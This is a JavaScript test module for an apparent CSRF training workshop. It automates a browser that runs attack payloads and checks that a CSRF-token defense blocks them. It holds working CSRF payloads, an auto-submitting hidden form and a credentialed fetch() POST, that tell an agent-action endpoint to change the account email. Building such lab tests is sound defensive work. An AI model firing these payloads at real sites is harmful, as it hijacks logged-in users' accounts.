'use strict';
const assert=require('node:assert/strict'),fs=require('node:fs'),path=require('node:path');
function payloads(origin){return {
 form:`<form id="csrf" action="${origin}/api/workshop/csrf/agent-action" method="POST"><input type="hidden" name="tab" value="post"><input type="hidden" name="message" value='change the account email; email="post-form@fixture.invalid"'></form><script>document.getElementById("csrf").submit();</script>`,
 fetch:`<script>fetch('${origin}/api/workshop/csrf/agent-action',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({tab:'post',message:'change the account email; email="post-fetch@fixture.invalid"'})}).catch(function(){});</script>`
};}
const CASES=Object.freeze([{id:'csrf_p1',index:0,kind:'form',resource:'document',status:200,total:1},{id:'csrf_p2',index:1,kind:'fetch',resource:'fetch',status:200,total:2},{id:'csrf_p3',index:2,kind:'form',resource:'document',status:403,total:3},{id:'csrf_p3',index:2,kind:'fetch',resource:'fetch',status:403,total:3,replay:true}]);
async function runPostChain({page,root,clickText,help,verify,siblingHttp,shot}){
 const htmls=payloads(require('../../server/services/csrfBrowserReceipt').VICTIM_ORIGIN);
 const responseFor=endpoint=>page.waitForResponse(r=>new URL(r.url()).pathname===endpoint&&r.request().method()==='POST',{timeout:require('../../server/services/csrfRuntimeBudget').observerMs});
 for(const c of CASES){
  if(c.id==='csrf_p3'&&!c.replay){const pending=responseFor('/api/workshop/csrf/defense-toggle');await clickText(page,'CSRF OFF · click to enable');const r=await pending;assert.equal(r.status(),200);assert.equal((await r.json()).victimState.defenses.csrfToken,true);await verify('post-defense-enabled',{siblingHttp:await siblingHttp()});}
  const skeleton=page.waitForResponse(r=>new URL(r.url()).pathname==='/api/workshop/csrf/payload/'+c.id+'/skeleton');await help(c.index,'Build payload');const s=await skeleton;assert.equal(s.status(),200);const data=await s.json();await page.waitForFunction(html=>document.querySelector('textarea.b-editor')?.value===html,{},data.html);await require('./csrfFullIndexEditor').replaceEditorText(page,await page.waitForSelector('textarea.b-editor'),htmls[c.kind]);
  const pending=responseFor('/api/workshop/csrf/browser-attempt');await clickText(page,'Execute observed payload');const r=await pending,body=await r.json();fs.writeFileSync(path.join(root,'csrf-post-'+c.id+'-'+c.kind+'.json'),JSON.stringify(body,null,2),{mode:0o600});assert.equal(r.status(),200);assert.deepEqual(body.newlyCompleted,c.replay?[]:[c.id]);assert.equal(body.browser.method,'POST');assert.equal(body.browser.resourceType,c.resource);assert.equal(body.browser.responseStatus,c.status);assert.equal(body.browser.responseObserved,true);await verify('post-effect',{...c,html:htmls[c.kind],body,siblingHttp:await siblingHttp()});await page.waitForFunction(n=>document.querySelector('.p-text')?.innerText.includes('Total: '+n+'/3'),{},c.total);await shot(page,'csrf-post-'+c.id+'-'+c.kind+'-completed');
 }
}
module.exports={payloads,CASES,runPostChain};
